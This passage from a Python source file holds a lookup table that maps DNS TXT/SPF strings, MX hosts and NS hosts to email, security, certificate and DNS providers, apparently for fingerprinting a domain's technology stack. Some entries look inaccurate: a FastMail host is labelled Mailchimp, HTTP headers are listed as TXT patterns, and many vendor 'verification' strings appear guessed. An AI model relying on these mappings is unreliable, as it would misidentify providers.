                    'v=spf1 include:sendinblue.com': {'name': 'Sendinblue', 'category': 'cloud_services'},
                    'v=spf1 include:elasticemail.com': {'name': 'Elastic Email', 'category': 'cloud_services'},
                    'v=spf1 include:postmarkapp.com': {'name': 'Postmark', 'category': 'cloud_services'},
                    'v=spf1 include:mandrillapp.com': {'name': 'Mandrill', 'category': 'cloud_services'},
                    'v=spf1 include:constantcontact.com': {'name': 'Constant Contact', 'category': 'cloud_services'},
                    'v=spf1 include:aweber.com': {'name': 'AWeber', 'category': 'cloud_services'},
                    'v=spf1 include:campaignmonitor.com': {'name': 'Campaign Monitor', 'category': 'cloud_services'},
                    'v=spf1 include:getresponse.com': {'name': 'GetResponse', 'category': 'cloud_services'},
                    'v=spf1 include:activecampaign.com': {'name': 'ActiveCampaign', 'category': 'cloud_services'},
                    'v=spf1 include:convertkit.com': {'name': 'ConvertKit', 'category': 'cloud_services'},
                    'v=spf1 include:drip.com': {'name': 'Drip', 'category': 'cloud_services'},
                    'v=spf1 include:infusionsoft.com': {'name': 'Infusionsoft', 'category': 'cloud_services'},
                    'v=spf1 include:keap.com': {'name': 'Keap', 'category': 'cloud_services'},
                    'v=spf1 include:ontraport.com': {'name': 'Ontraport', 'category': 'cloud_services'},
                    'v=spf1 include:pardot.com': {'name': 'Pardot', 'category': 'cloud_services'},
                    'v=spf1 include:marketo.com': {'name': 'Marketo', 'category': 'cloud_services'},
                    'v=spf1 include:hubspot.com': {'name': 'HubSpot', 'category': 'cloud_services'},
                    'v=spf1 include:salesforce.com': {'name': 'Salesforce', 'category': 'cloud_services'},
                    'v=spf1 include:pipedrive.com': {'name': 'Pipedrive', 'category': 'cloud_services'},
                    'v=spf1 include:zoho.com': {'name': 'Zoho Mail', 'category': 'cloud_services'},
                    'v=spf1 include:freshworks.com': {'name': 'Freshworks', 'category': 'cloud_services'},
                    'v=spf1 include:insightly.com': {'name': 'Insightly', 'category': 'cloud_services'},
                    'v=spf1 include:capsulecrm.com': {'name': 'Capsule', 'category': 'cloud_services'},
                    'v=spf1 include:sugarcrm.com': {'name': 'SugarCRM', 'category': 'cloud_services'},
                    'v=spf1 include:vtiger.com': {'name': 'Vtiger', 'category': 'cloud_services'},
                    'v=spf1 include:zurmo.com': {'name': 'Zurmo', 'category': 'cloud_services'},
                    'v=spf1 include:x2crm.com': {'name': 'X2CRM', 'category': 'cloud_services'},
                    'v=spf1 include:yetiforce.com': {'name': 'YetiForce', 'category': 'cloud_services'},
                    'v=spf1 include:dolibarr.org': {'name': 'Dolibarr', 'category': 'cloud_services'},
                    'v=spf1 include:civicrm.org': {'name': 'CiviCRM', 'category': 'cloud_services'},
                    'v=spf1 include:espocrm.com': {'name': 'EspoCRM', 'category': 'cloud_services'},
                    'v=spf1 include:suitecrm.com': {'name': 'SuiteCRM', 'category': 'cloud_services'},
                    
                    # Security & Anti-Spam
                    'v=spf1 -all': {'name': 'Strict SPF Policy', 'category': 'security_technologies'},
                    'v=spf1 ~all': {'name': 'Soft Fail SPF Policy', 'category': 'security_technologies'},
                    'v=spf1 ?all': {'name': 'Neutral SPF Policy', 'category': 'security_technologies'},
                    'v=spf1 +all': {'name': 'Pass All SPF Policy', 'category': 'security_technologies'},
                    'v=DMARC1': {'name': 'DMARC Policy', 'category': 'security_technologies'},
                    'v=DKIM1': {'name': 'DKIM Key', 'category': 'security_technologies'},
                    'barracuda-domain-verification': {'name': 'Barracuda', 'category': 'security_technologies'},
                    'proofpoint-verification': {'name': 'Proofpoint', 'category': 'security_technologies'},
                    'mimecast-verification': {'name': 'Mimecast', 'category': 'security_technologies'},
                    'symantec-verification': {'name': 'Symantec', 'category': 'security_technologies'},
                    'mcafee-verification': {'name': 'McAfee', 'category': 'security_technologies'},
                    'trendmicro-verification': {'name': 'Trend Micro', 'category': 'security_technologies'},
                    'fortimail-verification': {'name': 'FortiMail', 'category': 'security_technologies'},
                    'sophos-verification': {'name': 'Sophos', 'category': 'security_technologies'},
                    'kaspersky-verification': {'name': 'Kaspersky', 'category': 'security_technologies'},
                    'bitdefender-verification': {'name': 'Bitdefender', 'category': 'security_technologies'},
                    'avast-verification': {'name': 'Avast', 'category': 'security_technologies'},
                    'avg-verification': {'name': 'AVG', 'category': 'security_technologies'},
                    'norton-verification': {'name': 'Norton', 'category': 'security_technologies'},
                    'eset-verification': {'name': 'ESET', 'category': 'security_technologies'},
                    'f-secure-verification': {'name': 'F-Secure', 'category': 'security_technologies'},
                    'gdata-verification': {'name': 'G Data', 'category': 'security_technologies'},
                    'comodo-verification': {'name': 'Comodo', 'category': 'security_technologies'},
                    'checkpoint-verification': {'name': 'Check Point', 'category': 'security_technologies'},
                    'paloalto-verification': {'name': 'Palo Alto Networks', 'category': 'security_technologies'},
                    'fortinet-verification': {'name': 'Fortinet', 'category': 'security_technologies'},
                    'cisco-verification': {'name': 'Cisco', 'category': 'security_technologies'},
                    'juniper-verification': {'name': 'Juniper Networks', 'category': 'security_technologies'},
                    'sonicwall-verification': {'name': 'SonicWall', 'category': 'security_technologies'},
                    'watchguard-verification': {'name': 'WatchGuard', 'category': 'security_technologies'},
                    'barracuda-verification': {'name': 'Barracuda Networks', 'category': 'security_technologies'},
                    'cyberoam-verification': {'name': 'Cyberoam', 'category': 'security_technologies'},
                    'kemp-verification': {'name': 'Kemp Technologies', 'category': 'security_technologies'},
                    'f5-verification': {'name': 'F5 Networks', 'category': 'security_technologies'},
                    'citrix-verification': {'name': 'Citrix', 'category': 'security_technologies'},
                    'vmware-verification': {'name': 'VMware', 'category': 'security_technologies'},
                    'microsoft-verification': {'name': 'Microsoft', 'category': 'security_technologies'},
                    'amazon-verification': {'name': 'Amazon', 'category': 'security_technologies'},
                    'google-verification': {'name': 'Google', 'category': 'security_technologies'},
                    'cloudflare-verification': {'name': 'Cloudflare', 'category': 'security_technologies'},
                    'sucuri-verification': {'name': 'Sucuri', 'category': 'security_technologies'},
                    'wordfence-verification': {'name': 'Wordfence', 'category': 'security_technologies'},
                    'incapsula-verification': {'name': 'Incapsula', 'category': 'security_technologies'},
                    'imperva-verification': {'name': 'Imperva', 'category': 'security_technologies'},
                    'akamai-verification': {'name': 'Akamai', 'category': 'security_technologies'},
                    'fastly-verification': {'name': 'Fastly', 'category': 'security_technologies'},
                    'maxcdn-verification': {'name': 'MaxCDN', 'category': 'security_technologies'},
                    'stackpath-verification': {'name': 'StackPath', 'category': 'security_technologies'},
                    'keycdn-verification': {'name': 'KeyCDN', 'category': 'security_technologies'},
                    'bunnycdn-verification': {'name': 'BunnyCDN', 'category': 'security_technologies'},
                    'cachefly-verification': {'name': 'CacheFly', 'category': 'security_technologies'},
                    'belugacdn-verification': {'name': 'BelugaCDN', 'category': 'security_technologies'},
                    'rackspace-verification': {'name': 'Rackspace', 'category': 'security_technologies'},
                    'digitalocean-verification': {'name': 'DigitalOcean', 'category': 'security_technologies'},
                    'linode-verification': {'name': 'Linode', 'category': 'security_technologies'},
                    'vultr-verification': {'name': 'Vultr', 'category': 'security_technologies'},
                    'hetzner-verification': {'name': 'Hetzner', 'category': 'security_technologies'},
                    'ovh-verification': {'name': 'OVH', 'category': 'security_technologies'},
                    'scaleway-verification': {'name': 'Scaleway', 'category': 'security_technologies'},
                    'upcloud-verification': {'name': 'UpCloud', 'category': 'security_technologies'},
                    
                    # Certificate Authorities
                    'letsencrypt-verification': {'name': 'Let\'s Encrypt', 'category': 'security_technologies'},
                    'comodo-ca-verification': {'name': 'Comodo CA', 'category': 'security_technologies'},
                    'symantec-ca-verification': {'name': 'Symantec CA', 'category': 'security_technologies'},
                    'digicert-verification': {'name': 'DigiCert', 'category': 'security_technologies'},
                    'globalsign-verification': {'name': 'GlobalSign', 'category': 'security_technologies'},
                    'godaddy-ca-verification': {'name': 'GoDaddy CA', 'category': 'security_technologies'},
                    'thawte-verification': {'name': 'Thawte', 'category': 'security_technologies'},
                    'verisign-verification': {'name': 'VeriSign', 'category': 'security_technologies'},
                    'geotrust-verification': {'name': 'GeoTrust', 'category': 'security_technologies'},
                    'rapidssl-verification': {'name': 'RapidSSL', 'category': 'security_technologies'},
                    'startssl-verification': {'name': 'StartSSL', 'category': 'security_technologies'},
                    'wosign-verification': {'name': 'WoSign', 'category': 'security_technologies'},
                    'alphassl-verification': {'name': 'AlphaSSL', 'category': 'security_technologies'},
                    'trustwave-verification': {'name': 'Trustwave', 'category': 'security_technologies'},
                    'entrust-verification': {'name': 'Entrust', 'category': 'security_technologies'},
                    'sectigo-verification': {'name': 'Sectigo', 'category': 'security_technologies'},
                    'zerossl-verification': {'name': 'ZeroSSL', 'category': 'security_technologies'},
                    'buypass-verification': {'name': 'Buypass', 'category': 'security_technologies'},
                    'ssl-com-verification': {'name': 'SSL.com', 'category': 'security_technologies'},
                    'ssls-com-verification': {'name': 'SSLS.com', 'category': 'security_technologies'},
                    'namecheap-ssl-verification': {'name': 'Namecheap SSL', 'category': 'security_technologies'},
                    'cloudflare-ssl-verification': {'name': 'Cloudflare SSL', 'category': 'security_technologies'},
                    'amazon-ssl-verification': {'name': 'Amazon SSL', 'category': 'security_technologies'},
                    'google-ssl-verification': {'name': 'Google SSL', 'category': 'security_technologies'},
                    'microsoft-ssl-verification': {'name': 'Microsoft SSL', 'category': 'security_technologies'},
                    'letsencrypt-ssl-verification': {'name': 'Let\'s Encrypt SSL', 'category': 'security_technologies'},
                    'acme-challenge': {'name': 'ACME Challenge', 'category': 'security_technologies'},
                    'ca-issuers': {'name': 'CA Issuers', 'category': 'security_technologies'},
                    'ocsp': {'name': 'OCSP', 'category': 'security_technologies'},
                    'crl': {'name': 'Certificate Revocation List', 'category': 'security_technologies'},
                    'ct-logs': {'name': 'Certificate Transparency Logs', 'category': 'security_technologies'},
                    'sct': {'name': 'Signed Certificate Timestamp', 'category': 'security_technologies'},
                    'expect-ct': {'name': 'Expect-CT', 'category': 'security_technologies'},
                    'expect-staple': {'name': 'Expect-Staple', 'category': 'security_technologies'},
                    'hpkp': {'name': 'HTTP Public Key Pinning', 'category': 'security_technologies'},
                    'hsts': {'name': 'HTTP Strict Transport Security', 'category': 'security_technologies'},
                    'csp': {'name': 'Content Security Policy', 'category': 'security_technologies'},
                    'upgrade-insecure-requests': {'name': 'Upgrade Insecure Requests', 'category': 'security_technologies'},
                    'referrer-policy': {'name': 'Referrer Policy', 'category': 'security_technologies'},
                    'feature-policy': {'name': 'Feature Policy', 'category': 'security_technologies'},
                    'permissions-policy': {'name': 'Permissions Policy', 'category': 'security_technologies'},
                    'x-frame-options': {'name': 'X-Frame-Options', 'category': 'security_technologies'},
                    'x-content-type-options': {'name': 'X-Content-Type-Options', 'category': 'security_technologies'},
                    'x-xss-protection': {'name': 'X-XSS-Protection', 'category': 'security_technologies'},
                    'cross-origin-embedder-policy': {'name': 'Cross-Origin-Embedder-Policy', 'category': 'security_technologies'},
                    'cross-origin-opener-policy': {'name': 'Cross-Origin-Opener-Policy', 'category': 'security_technologies'},
                    'cross-origin-resource-policy': {'name': 'Cross-Origin-Resource-Policy', 'category': 'security_technologies'},
                    'origin-agent-cluster': {'name': 'Origin-Agent-Cluster', 'category': 'security_technologies'},
                    'sec-fetch-site': {'name': 'Sec-Fetch-Site', 'category': 'security_technologies'},
                    'sec-fetch-mode': {'name': 'Sec-Fetch-Mode', 'category': 'security_technologies'},
                    'sec-fetch-user': {'name': 'Sec-Fetch-User', 'category': 'security_technologies'},
                    'sec-fetch-dest': {'name': 'Sec-Fetch-Dest', 'category': 'security_technologies'},
                    'sec-websocket-protocol': {'name': 'Sec-WebSocket-Protocol', 'category': 'security_technologies'},
                    'sec-websocket-extensions': {'name': 'Sec-WebSocket-Extensions', 'category': 'security_technologies'},
                    'sec-websocket-key': {'name': 'Sec-WebSocket-Key', 'category': 'security_technologies'},
                    'sec-websocket-accept': {'name': 'Sec-WebSocket-Accept', 'category': 'security_technologies'},
                    'sec-websocket-version': {'name': 'Sec-WebSocket-Version', 'category': 'security_technologies'}
                },
                
                'MX': {
                    # Google Workspace
                    'aspmx.l.google.com': {'name': 'Google Workspace', 'category': 'cloud_services'},
                    'alt1.aspmx.l.google.com': {'name': 'Google Workspace', 'category': 'cloud_services'},
                    'alt2.aspmx.l.google.com': {'name': 'Google Workspace', 'category': 'cloud_services'},
                    'alt3.aspmx.l.google.com': {'name': 'Google Workspace', 'category': 'cloud_services'},
                    'alt4.aspmx.l.google.com': {'name': 'Google Workspace', 'category': 'cloud_services'},
                    'gmail-smtp-in.l.google.com': {'name': 'Gmail', 'category': 'cloud_services'},
                    
                    # Microsoft Office 365
                    'mail.protection.outlook.com': {'name': 'Microsoft Office 365', 'category': 'cloud_services'},
                    'outlook.office365.com': {'name': 'Microsoft Office 365', 'category': 'cloud_services'},
                    'smtp.office365.com': {'name': 'Microsoft Office 365', 'category': 'cloud_services'},
                    'exchange.office365.com': {'name': 'Microsoft Exchange Online', 'category': 'cloud_services'},
                    
                    # Zoho Mail
                    'mx.zoho.com': {'name': 'Zoho Mail', 'category': 'cloud_services'},
                    'mx2.zoho.com': {'name': 'Zoho Mail', 'category': 'cloud_services'},
                    'mx3.zoho.com': {'name': 'Zoho Mail', 'category': 'cloud_services'},
                    
                    # ProtonMail
                    'mail.protonmail.ch': {'name': 'ProtonMail', 'category': 'cloud_services'},
                    'mailsec.protonmail.ch': {'name': 'ProtonMail', 'category': 'cloud_services'},
                    
                    # Tutanota
                    'mail.tutanota.de': {'name': 'Tutanota', 'category': 'cloud_services'},
                    
                    # FastMail
                    'in1-smtp.messagingengine.com': {'name': 'FastMail', 'category': 'cloud_services'},
                    'in2-smtp.messagingengine.com': {'name': 'FastMail', 'category': 'cloud_services'},
                    
                    # Rackspace Email
                    'mx1.emailsrvr.com': {'name': 'Rackspace Email', 'category': 'cloud_services'},
                    'mx2.emailsrvr.com': {'name': 'Rackspace Email', 'category': 'cloud_services'},
                    
                    # Amazon WorkMail
                    'inbound-smtp.us-east-1.amazonaws.com': {'name': 'Amazon WorkMail', 'category': 'cloud_services'},
                    'inbound-smtp.us-west-2.amazonaws.com': {'name': 'Amazon WorkMail', 'category': 'cloud_services'},
                    'inbound-smtp.eu-west-1.amazonaws.com': {'name': 'Amazon WorkMail', 'category': 'cloud_services'},
                    
                    # Mailgun
                    'mxa.mailgun.org': {'name': 'Mailgun', 'category': 'cloud_services'},
                    'mxb.mailgun.org': {'name': 'Mailgun', 'category': 'cloud_services'},
                    
                    # SendGrid
                    'mx.sendgrid.net': {'name': 'SendGrid', 'category': 'cloud_services'},
                    
                    # Postmark
                    'inbound.postmarkapp.com': {'name': 'Postmark', 'category': 'cloud_services'},
                    
                    # Mailchimp
                    'mail.messagingengine.com': {'name': 'Mailchimp', 'category': 'cloud_services'},
                    
                    # Cloudflare Email Routing
                    'route1.mx.cloudflare.net': {'name': 'Cloudflare Email Routing', 'category': 'cloud_services'},
                    'route2.mx.cloudflare.net': {'name': 'Cloudflare Email Routing', 'category': 'cloud_services'},
                    'route3.mx.cloudflare.net': {'name': 'Cloudflare Email Routing', 'category': 'cloud_services'},
                    
                    # ImprovMX
                    'mx1.improvmx.com': {'name': 'ImprovMX', 'category': 'cloud_services'},
                    'mx2.improvmx.com': {'name': 'ImprovMX', 'category': 'cloud_services'},
                    
                    # ForwardMX
                    'fmx1.forwardemail.net': {'name': 'Forward Email', 'category': 'cloud_services'},
                    'fmx2.forwardemail.net': {'name': 'Forward Email', 'category': 'cloud_services'},
                    
                    # Yandex Mail
                    'mx.yandex.net': {'name': 'Yandex Mail', 'category': 'cloud_services'},
                    'mx.yandex.ru': {'name': 'Yandex Mail', 'category': 'cloud_services'},
                    
                    # Mail.ru
                    'mx.mail.ru': {'name': 'Mail.ru', 'category': 'cloud_services'},
                    
                    # 1&1 IONOS
                    'mx00.ionos.com': {'name': 'IONOS', 'category': 'cloud_services'},
                    'mx01.ionos.com': {'name': 'IONOS', 'category': 'cloud_services'},
                    
                    # GoDaddy
                    'smtp.secureserver.net': {'name': 'GoDaddy', 'category': 'cloud_services'},
                    'mailstore1.secureserver.net': {'name': 'GoDaddy', 'category': 'cloud_services'},
                    
                    # Namecheap
                    'mail.privateemail.com': {'name': 'Namecheap Private Email', 'category': 'cloud_services'},
                    
                    # Bluehost
                    'mail.bluehost.com': {'name': 'Bluehost', 'category': 'cloud_services'},
                    
                    # HostGator
                    'mail.hostgator.com': {'name': 'HostGator', 'category': 'cloud_services'},
                    
                    # SiteGround
                    'mail.siteground.com': {'name': 'SiteGround', 'category': 'cloud_services'},
                    
                    # DreamHost
                    'mx1.dreamhost.com': {'name': 'DreamHost', 'category': 'cloud_services'},
                    'mx2.dreamhost.com': {'name': 'DreamHost', 'category': 'cloud_services'},
                    
                    # InMotion Hosting
                    'mail.inmotionhosting.com': {'name': 'InMotion Hosting', 'category': 'cloud_services'},
                    
                    # A2 Hosting
                    'mail.a2hosting.com': {'name': 'A2 Hosting', 'category': 'cloud_services'},
                    
                    # Hover
                    'mail.hover.com': {'name': 'Hover', 'category': 'cloud_services'},
                    
                    # Gandi
                    'spool.mail.gandi.net': {'name': 'Gandi', 'category': 'cloud_services'},
                    'fb.mail.gandi.net': {'name': 'Gandi', 'category': 'cloud_services'},
                    
                    # OVH
                    'mx1.mail.ovh.net': {'name': 'OVH', 'category': 'cloud_services'},
                    'mx2.mail.ovh.net': {'name': 'OVH', 'category': 'cloud_services'},
                    
                    # Hetzner
                    'mail.your-server.de': {'name': 'Hetzner', 'category': 'cloud_services'},
                    
                    # DigitalOcean
                    'mail.digitalocean.com': {'name': 'DigitalOcean', 'category': 'cloud_services'},
                    
                    # Linode
                    'mail.linode.com': {'name': 'Linode', 'category': 'cloud_services'},
                    
                    # Vultr
                    'mail.vultr.com': {'name': 'Vultr', 'category': 'cloud_services'},
                    
                    # Scaleway
                    'mail.scaleway.com': {'name': 'Scaleway', 'category': 'cloud_services'},
                    
                    # UpCloud
                    'mail.upcloud.com': {'name': 'UpCloud', 'category': 'cloud_services'},
                    
                    # Generic patterns
                    'mail.': {'name': 'Generic Mail Server', 'category': 'cloud_services'},
                    'mx.': {'name': 'Generic MX Server', 'category': 'cloud_services'},
                    'smtp.': {'name': 'Generic SMTP Server', 'category': 'cloud_services'},
                    'email.': {'name': 'Generic Email Server', 'category': 'cloud_services'},
                    'mx1.': {'name': 'Primary MX Server', 'category': 'cloud_services'},
                    'mx2.': {'name': 'Secondary MX Server', 'category': 'cloud_services'},
                    'mx3.': {'name': 'Tertiary MX Server', 'category': 'cloud_services'},
                    'aspmx.': {'name': 'Google MX Server', 'category': 'cloud_services'},
                    'alt1.aspmx.': {'name': 'Google Alt MX Server', 'category': 'cloud_services'},
                    'alt2.aspmx.': {'name': 'Google Alt MX Server', 'category': 'cloud_services'},
                    'alt3.aspmx.': {'name': 'Google Alt MX Server', 'category': 'cloud_services'},
                    'alt4.aspmx.': {'name': 'Google Alt MX Server', 'category': 'cloud_services'}
                },
                
                'NS': {
                    # Major DNS Providers
                    'ns1.cloudflare.com': {'name': 'Cloudflare DNS', 'category': 'cloud_services'},
                    'ns2.cloudflare.com': {'name': 'Cloudflare DNS', 'category': 'cloud_services'},
                    'ns1.google.com': {'name': 'Google Cloud DNS', 'category': 'cloud_services'},
                    'ns2.google.com': {'name': 'Google Cloud DNS', 'category': 'cloud_services'},
                    'ns3.google.com': {'name': 'Google Cloud DNS', 'category': 'cloud_services'},
                    'ns4.google.com': {'name': 'Google Cloud DNS', 'category': 'cloud_services'},
                    'dns1.p01.nsone.net': {'name': 'NS1', 'category': 'cloud_services'},
                    'dns2.p01.nsone.net': {'name': 'NS1', 'category': 'cloud_services'},
                    'dns3.p01.nsone.net': {'name': 'NS1', 'category': 'cloud_services'},
                    'dns4.p01.nsone.net': {'name': 'NS1', 'category': 'cloud_services'},
                    'route53.amazonaws.com': {'name': 'Amazon Route 53', 'category': 'cloud_services'},
                    'awsdns': {'name': 'Amazon Route 53', 'category': 'cloud_services'},
                    'ns1-01.azure-dns.com': {'name': 'Microsoft Azure DNS', 'category': 'cloud_services'},
                    'ns2-01.azure-dns.net': {'name': 'Microsoft Azure DNS', 'category': 'cloud_services'},
                    'ns3-01.azure-dns.org': {'name': 'Microsoft Azure DNS', 'category': 'cloud_services'},
                    'ns4-01.azure-dns.info': {'name': 'Microsoft Azure DNS', 'category': 'cloud_services'},
                    'dns1.registrar-servers.com': {'name': 'Namecheap DNS', 'category': 'cloud_services'},
                    'dns2.registrar-servers.com': {'name': 'Namecheap DNS', 'category': 'cloud_services'},
                    'ns1.digitalocean.com': {'name': 'DigitalOcean DNS', 'category': 'cloud_services'},
                    'ns2.digitalocean.com': {'name': 'DigitalOcean DNS', 'category': 'cloud_services'},
                    'ns3.digitalocean.com': {'name': 'DigitalOcean DNS', 'category': 'cloud_services'},
                    'dns1.p08.nsone.net': {'name': 'NS1', 'category': 'cloud_services'},
                    'dns2.p08.nsone.net': {'name': 'NS1', 'category': 'cloud_services'},
                    'dns3.p08.nsone.net': {'name': 'NS1', 'category': 'cloud_services'},
                    'dns4.p08.nsone.net': {'name': 'NS1', 'category': 'cloud_services'},
                    'ns1.linode.com': {'name': 'Linode DNS', 'category': 'cloud_services'},
                    'ns2.linode.com': {'name': 'Linode DNS', 'category': 'cloud_services'},
                    'ns3.linode.com': {'name': 'Linode DNS', 'category': 'cloud_services'},
                    'ns4.linode.com': {'name': 'Linode DNS', 'category': 'cloud_services'},
                    'ns5.linode.com': {'name': 'Linode DNS', 'category': 'cloud_services'},
                    'ns1.vultr.com': {'name': 'Vultr DNS', 'category': 'cloud_services'},
                    'ns2.vultr.com': {'name': 'Vultr DNS', 'category': 'cloud_services'},
                    'pdns1.ultradns.net': {'name': 'UltraDNS', 'category': 'cloud_services'},
                    'pdns2.ultradns.net': {'name': 'UltraDNS', 'category': 'cloud_services'},
                    'pdns3.ultradns.org': {'name': 'UltraDNS', 'category': 'cloud_services'},
                    'pdns4.ultradns.org': {'name': 'UltraDNS', 'category': 'cloud_services'},
                    'pdns5.ultradns.info': {'name': 'UltraDNS', 'category': 'cloud_services'},
                    'pdns6.ultradns.co.uk': {'name': 'UltraDNS', 'category': 'cloud_services'},
                    'ns1.dnsimple.com': {'name': 'DNSimple', 'category': 'cloud_services'},
                    'ns2.dnsimple.com': {'name': 'DNSimple', 'category': 'cloud_services'},
                    'ns3.dnsimple.com': {'name': 'DNSimple', 'category': 'cloud_services'},
                    'ns4.dnsimple.com': {'name': 'DNSimple', 'category': 'cloud_services'},
                    'dns1.name-services.com': {'name': 'Network Solutions', 'category': 'cloud_services'},
                    'dns2.name-services.com': {'name': 'Network Solutions', 'category': 'cloud_services'},
                    'dns3.name-services.com': {'name': 'Network Solutions', 'category': 'cloud_services'},
                    'dns4.name-services.com': {'name': 'Network Solutions', 'category': 'cloud_services'},
                    'dns5.name-services.com': {'name': 'Network Solutions', 'category': 'cloud_services'},
                    'ns1.dnsmadeeasy.com': {'name': 'DNS Made Easy', 'category': 'cloud_services'},
                    'ns2.dnsmadeeasy.com': {'name': 'DNS Made Easy', 'category': 'cloud_services'},
                    'ns3.dnsmadeeasy.com': {'name': 'DNS Made Easy', 'category': 'cloud_services'},
                    'ns4.dnsmadeeasy.com': {'name': 'DNS Made Easy', 'category': 'cloud_services'},
                    'ns5.dnsmadeeasy.com': {'name': 'DNS Made Easy', 'category': 'cloud_services'},
                    'ns1.zoneedit.com': {'name': 'ZoneEdit', 'category': 'cloud_services'},
                    'ns2.zoneedit.com': {'name': 'ZoneEdit', 'category': 'cloud_services'},
                    'ns3.zoneedit.com': {'name': 'ZoneEdit', 'category': 'cloud_services'},
                    'ns4.zoneedit.com': {'name': 'ZoneEdit', 'category': 'cloud_services'},
                    'ns5.zoneedit.com': {'name': 'ZoneEdit', 'category': 'cloud_services'},
                    'ns1.afraid.org': {'name': 'FreeDNS', 'category': 'cloud_services'},
                    'ns2.afraid.org': {'name': 'FreeDNS', 'category': 'cloud_services'},
                    'ns3.afraid.org': {'name': 'FreeDNS', 'category': 'cloud_services'},
                    'ns4.afraid.org': {'name': 'FreeDNS', 'category': 'cloud_services'},
                    'f1g1ns1.dnspod.net': {'name': 'DNSPod', 'category': 'cloud_services'},
                    'f1g1ns2.dnspod.net': {'name': 'DNSPod', 'category': 'cloud_services'},
                    'ns1.he.net': {'name': 'Hurricane Electric', 'category': 'cloud_services'},
                    'ns2.he.net': {'name': 'Hurricane Electric', 'category': 'cloud_services'},
                    'ns3.he.net': {'name': 'Hurricane Electric', 'category': 'cloud_services'},
                    'ns4.he.net': {'name': 'Hurricane Electric', 'category': 'cloud_services'},
                    'ns5.he.net': {'name': 'Hurricane Electric', 'category': 'cloud_services'},
                    'ns1.easydns.com': {'name': 'EasyDNS', 'category': 'cloud_services'},
                    'ns2.easydns.com': {'name': 'EasyDNS', 'category': 'cloud_services'},
                    'ns3.easydns.org': {'name': 'EasyDNS', 'category': 'cloud_services'},
                    'ns4.easydns.info': {'name': 'EasyDNS', 'category': 'cloud_services'},
                    'remote1.easydns.com': {'name': 'EasyDNS', 'category': 'cloud_services'},
                    'remote2.easydns.com': {'name': 'EasyDNS', 'category': 'cloud_services'},
                    'puck.nether.net': {'name': 'Nether.net', 'category': 'cloud_services'},
                    'ns.nether.net': {'name': 'Nether.net', 'category': 'cloud_services'},
                    'ns1.hover.com': {'name': 'Hover DNS', 'category': 'cloud_services'},
                    'ns2.hover.com': {'name': 'Hover DNS', 'category': 'cloud_services'},
                    'ns1.gandi.net': {'name': 'Gandi DNS', 'category': 'cloud_services'},
                    'ns2.gandi.net': {'name': 'Gandi DNS', 'category': 'cloud_services'},
                    'ns3.gandi.net': {'name': 'Gandi DNS', 'category': 'cloud_services'},
                    'ns4.gandi.net': {'name': 'Gandi DNS', 'category': 'cloud_services'},
                    'ns5.gandi.net': {'name': 'Gandi DNS', 'category': 'cloud_services'},
                    'ns6.gandi.net': {'name': 'Gandi DNS', 'category': 'cloud_services'},
                    'ns-cloud-a1.googledomains.com': {'name': 'Google Domains', 'category': 'cloud_services'},
                    'ns-cloud-a2.googledomains.com': {'name': 'Google Domains', 'category': 'cloud_services'},
                    'ns-cloud-a3.googledomains.com': {'name': 'Google Domains', 'category': 'cloud_services'},
                    'ns-cloud-a4.googledomains.com': {'name': 'Google Domains', 'category': 'cloud_services'},
                    'ns1.godaddy.com': {'name': 'GoDaddy DNS', 'category': 'cloud_services'},
                    'ns2.godaddy.com': {'name': 'GoDaddy DNS', 'category': 'cloud_services'},
                    'ns3.godaddy.com': {'name': 'GoDaddy DNS', 'category': 'cloud_services'},
                    'ns4.godaddy.com': {'name': 'GoDaddy DNS', 'category': 'cloud_services'},
                    'ns5.godaddy.com': {'name': 'GoDaddy DNS', 'category': 'cloud_services'},
                    'ns6.godaddy.com': {'name': 'GoDaddy DNS', 'category': 'cloud_services'},
                    'ns7.godaddy.com': {'name': 'GoDaddy DNS', 'category': 'cloud_services'},
                    'ns8.godaddy.com': {'name': 'GoDaddy DNS', 'category': 'cloud_services'},
                    'ns1.bluehost.com': {'name': 'Bluehost DNS', 'category': 'cloud_services'},
                    'ns2.bluehost.com': {'name': 'Bluehost DNS', 'category': 'cloud_services'},
                    'ns1.hostgator.com': {'name': 'HostGator DNS', 'category': 'cloud_services'},
                    'ns2.hostgator.com': {'name': 'HostGator DNS', 'category': 'cloud_services'},
                    'ns1.siteground.com': {'name': 'SiteGround DNS', 'category': 'cloud_services'},
                    'ns2.siteground.com': {'name': 'SiteGround DNS', 'category': 'cloud_services'},
                    'ns1.dreamhost.com': {'name': 'DreamHost DNS', 'category': 'cloud_services'},
                    'ns2.dreamhost.com': {'name': 'DreamHost DNS', 'category': 'cloud_services'},
                    'ns3.dreamhost.com': {'name': 'DreamHost DNS', 'category': 'cloud_services'},
                    'ns1.inmotionhosting.com': {'name': 'InMotion DNS', 'category': 'cloud_services'},
                    'ns2.inmotionhosting.com': {'name': 'InMotion DNS', 'category': 'cloud_services'},
                    'ns1.a2hosting.com': {'name': 'A2 Hosting DNS', 'category': 'cloud_services'},
                    'ns2.a2hosting.com': {'name': 'A2 Hosting DNS', 'category': 'cloud_services'},
                    'ns3.a2hosting.com': {'name': 'A2 Hosting DNS', 'category': 'cloud_services'},
                    'ns4.a2hosting.com': {'name': 'A2 Hosting DNS', 'category': 'cloud_services'},
                    'ns1.ovh.net': {'name': 'OVH DNS', 'category': 'cloud_services'},
                    'ns2.ovh.net': {'name': 'OVH DNS', 'category': 'cloud_services'},
                    'ns3.ovh.net': {'name': 'OVH DNS', 'category': 'cloud_services'},
                    'ns4.ovh.net': {'name': 'OVH DNS', 'category': 'cloud_services'},
                    'ns5.ovh.net': {'name': 'OVH DNS', 'category': 'cloud_services'},
                    'ns1.hetzner.de': {'name': 'Hetzner DNS', 'category': 'cloud_services'},
                    'ns2.hetzner.de': {'name': 'Hetzner DNS', 'category': 'cloud_services'},
                    'ns3.hetzner.de': {'name': 'Hetzner DNS', 'category': 'cloud_services'},
                    'ns1.scaleway.com': {'name': 'Scaleway DNS', 'category': 'cloud_services'},
                    'ns2.scaleway.com': {'name': 'Scaleway DNS', 'category': 'cloud_services'},
                    'ns1.upcloud.com': {'name': 'UpCloud DNS', 'category': 'cloud_services'},
                    'ns2.upcloud.com': {'name': 'UpCloud DNS', 'category': 'cloud_services'},
                    'ns3.upcloud.com': {'name': 'UpCloud DNS', 'category': 'cloud_services'},
                    'ns4.upcloud.com': {'name': 'UpCloud DNS', 'category': 'cloud_services'},
                    'ns5.upcloud.com': {'name': 'UpCloud DNS', 'category': 'cloud_services'},
                    
                    # Website Builder DNS
                    'ns1.squarespace.com': {'name': 'Squarespace DNS', 'category': 'cms_platforms'},
                    'ns2.squarespace.com': {'name': 'Squarespace DNS', 'category': 'cms_platforms'},
